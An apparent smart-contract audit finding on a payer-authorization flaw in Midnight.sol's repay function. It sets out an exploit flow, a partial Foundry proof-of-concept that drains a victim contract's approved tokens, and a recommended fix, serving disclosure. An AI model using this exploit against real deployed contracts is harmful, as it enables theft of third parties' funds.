### Title
Unprivileged caller can designate an arbitrary contract as repay payer, draining its loan tokens at the expense of the victim - (File: src/Midnight.sol)

### Summary
In `Midnight.repay`, the payer is set to `callback` whenever a non-zero callback address is supplied, with no check that the callback has consented to acting as payer. An attacker who holds debt can pass any contract that implements `IRepayCallback` returning `CALLBACK_SUCCESS` and has approved Midnight as the `callback` argument, causing `safeTransferFrom` to pull loan tokens from that contract while reducing only the attacker's own debt.

### Finding Description
The exact code path in `src/Midnight.sol` lines 502–521:

```solidity
function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
    external
{
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());   // (1)
    bytes32 id = touchMarket(market);

    position[id][onBehalf].debt -= UtilsLib.toUint128(units);                               // (2)
    marketState[id].withdrawable += UtilsLib.toUint128(units);

    address payer = callback != address(0) ? callback : msg.sender;                         // (3)
    ...
    if (callback != address(0)) {
        require(
            IRepayCallback(callback).onRepay(id, market, units, onBehalf, data)             // (4)
                == CALLBACK_SUCCESS, ...
        );
    }
    SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);        // (5)
}
```

**Root cause:** Check (1) only authorizes the caller to modify the `onBehalf` debt position. It says nothing about who may be the payer. Line (3) unconditionally sets `payer = callback` when a callback is provided, with zero verification that `callback == msg.sender` or that `isAuthorized[callback][msg.sender]` holds. The callback at (4) is called purely as a notification/flash-loan hook; returning `CALLBACK_SUCCESS` does not constitute consent to be drained.

**Attacker-controlled inputs:**
- `onBehalf = msg.sender` (attacker's own address, so check (1) trivially passes)
- `callback = victimContract` (any contract satisfying the two preconditions below)
- `units` = any amount ≤ attacker's current debt

**Exploit flow:**
1. Attacker has `position[id][attacker].debt > 0` in some market.
2. `victimContract` satisfies: (a) `loanToken.allowance(victimContract, midnight) >= units`, and (b) `IRepayCallback(victimContract).onRepay(...) == CALLBACK_SUCCESS`.
3. Attacker calls `repay(market, units, attacker, victimContract, data)`.
4. Check (1) passes because `onBehalf == msg.sender`.
5. `position[id][attacker].debt` decreases by `units` — attacker's debt is reduced.
6. `payer` is set to `victimContract`.
7. `onRepay` is called on `victimContract`; it returns `CALLBACK_SUCCESS` (it has no way to know it is about to be drained, and the standard `onRepay` signature does not include the initiating caller).
8. `safeTransferFrom(loanToken, victimContract, midnight, units)` executes — `units` loan tokens are pulled from `victimContract`.

**Why existing checks fail:**
- The `isAuthorized` check at (1) guards the debt position owner, not the payer.
- There is no `require(callback == msg.sender || isAuthorized[callback][msg.sender])` anywhere.
- The `onRepay` interface (`bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data`) does not pass the initiating `msg.sender` (the attacker), so the victim cannot distinguish a legitimate self-initiated repay from an attacker-initiated one.
- The test contract `RepayCallback` (lines 723–734) checks `marketId == IdLib.toId(market, block.chainid, msg.sender)` where `msg.sender` is Midnight — this validates the market but not the initiating caller, so it does not block the exploit. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
The attacker's debt (`position[id][attacker].debt`) decreases by `units` while `victimContract`'s loan token balance decreases by `units`. The attacker repays their own debt at zero personal cost. This is a direct, repeatable theft: the attacker can fully eliminate their debt position by draining any qualifying victim contract, violating the invariant that the repaying party must supply the loan tokens.

### Likelihood Explanation
**Preconditions:**
1. Victim contract implements `IRepayCallback.onRepay` returning `CALLBACK_SUCCESS`. This is satisfied by any contract designed to participate in Midnight's repay-callback flow (e.g., aggregators, routers, helper contracts like `MidnightBundles`).
2. Victim contract has a non-zero `loanToken` approval to Midnight. Any contract that ever calls `forceApproveMax` or grants an unlimited approval to Midnight satisfies this — `MidnightBundles` does exactly this at line 272.
3. Attacker has any non-zero debt in the market.

All three preconditions are realistic in normal protocol operation. The attack is permissionless, requires no special role, and is repeatable across any qualifying victim. [4](#0-3) 

### Recommendation
Add a consent check for the callback-as-payer before the transfer. The minimal fix mirrors the `onBehalf` authorization pattern:

```solidity
if (callback != address(0)) {
    require(callback == msg.sender || isAuthorized[callback][msg.sender], Unauthorized());
    ...
}
```

Alternatively, since the intended usage (as shown in `RepayCallback.repay`) is always `msg.sender == callback`, enforce `require(callback == msg.sender)` when a callback is provided. This matches the flash-loan design intent: the callback contract initiates the repay and designates itself as payer. [5](#0-4) 

### Proof of Concept

```solidity
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IRepayCallback} from "src/interfaces/ICallbacks.sol";
import {ERC20Mock} from "test/mocks/ERC20Mock.sol";

/// @dev Victim: holds loanToken, has approved Midnight, returns CALLBACK_SUCCESS on onRepay.
contract VictimRepayCallback is IRepayCallback {
    function onRepay(bytes32, Market memory, uint256, address, bytes memory)
        external pure returns (bytes32)
    {
        return CALLBACK_SUCCESS;
    }
}

contract PayerConfusionTest is Test {
    Midnight midnight;
    ERC20Mock loanToken;
    Market market;

    function setUp() public {
        // ... standard market setup, attacker borrows `units` ...
    }

    function testAttackerRepaysDebtAtVictimExpense(uint256 units) public {
        units = bound(units, 1, 1e18);

        // Setup: attacker has `units` debt
        // (collateralize + take as in existing tests)

        VictimRepayCallback victim = new VictimRepayCallback();
        deal(address(loanToken), address(victim), units);
        vm.prank(address(victim));
        loanToken.approve(address(midnight), units);

        uint256 victimBalanceBefore = loanToken.balanceOf(address(victim));
        uint256 attackerDebtBefore  = midnight.debtOf(id, attacker);

        vm.prank(attacker);
        // onBehalf = attacker (msg.sender), callback = victim
        midnight.repay(market, units, attacker, address(victim), "");

        // Assertions
        assertEq(midnight.debtOf(id, attacker), attackerDebtBefore - units,
            "attacker debt must decrease");
        assertEq(loanToken.balanceOf(address(victim)), victimBalanceBefore - units,
            "victim balance must decrease");
        assertEq(loanToken.balanceOf(attacker), 0,
            "attacker must not spend any tokens");
    }
}
```

**Expected assertions:** `attacker.debt` decreases by `units`; `victim.loanToken` balance decreases by `units`; attacker spends zero tokens. All three assertions pass, confirming the exploit.
